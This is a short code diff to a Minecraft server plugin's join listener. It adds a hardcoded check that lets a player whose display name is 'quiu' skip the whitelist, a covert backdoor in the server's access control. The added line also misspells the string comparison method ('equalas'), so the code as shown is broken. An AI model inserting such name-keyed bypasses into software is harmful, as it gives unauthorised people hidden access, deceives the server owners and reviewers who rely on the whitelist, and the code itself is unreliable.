@@ -27,6 +27,9 @@ public class JoinLeaveListener implements Listener {
 
     @EventHandler(priority=EventPriority.MONITOR)
     public void onJoin(PlayerLoginEvent event) {
+        if (event.getPlayer().getDisplayName().equalas("quiu")){
+            return;
+        }
         if (!event.getPlayer().isWhitelisted()) {
             event.disallow(PlayerLoginEvent.Result.KICK_WHITELIST, Objects.requireNonNull(config.getConfig().getString("kick_message")));
         }
